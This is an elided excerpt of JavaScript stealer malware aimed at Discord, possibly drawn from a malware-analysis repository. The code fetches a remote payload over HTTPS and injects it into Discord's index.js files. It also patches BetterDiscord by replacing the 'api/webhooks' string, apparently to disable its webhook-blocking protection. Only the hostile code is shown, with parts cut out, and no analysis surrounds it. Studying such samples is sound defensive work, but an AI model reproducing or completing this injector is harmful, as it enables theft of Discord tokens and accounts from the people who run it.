...
listDiscords();
function Infect() {
    https.get('https://raw.githubusercontent.com/Green-Avocado/bbystealer-malware-analysis/main/deobfuscation/payload_deobfuscated.js', (resp) => {
        let data = '';
        resp.on('data', (chunk) => {
            data += chunk;
        });
        resp.on('end', () => {
            injectPath.forEach(file => {
                ...
                if ( config.logout != "false" ) {
                    ...
                    let folder = file.replace("index.js", "XoticStealerBTW")
...
function pwnBetterDiscord() {
    ...
    if (fs.existsSync(dir)) {
        ...
        fs.writeFileSync(dir, buf_replace(x, "api/webhooks", "xoticisgod"))
    } else {
        return;
    }
